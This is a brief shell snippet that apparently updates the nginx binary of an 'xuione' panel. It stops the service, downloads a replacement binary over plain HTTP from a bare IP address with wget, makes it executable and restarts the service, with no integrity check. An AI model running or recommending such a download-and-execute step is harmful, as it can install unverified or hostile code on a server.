/home/xui/bin/nginx/sbin/nginx -v

service xuione stop
cd /home/xui/bin/nginx/sbin/
mv nginx nginx_bk

wget http://138.199.9.175:80/nginx

chmod 550 nginx
chmod +x nginx
chown xui:xui nginx

service xuione start

/home/xui/bin/nginx/sbin/nginx -v
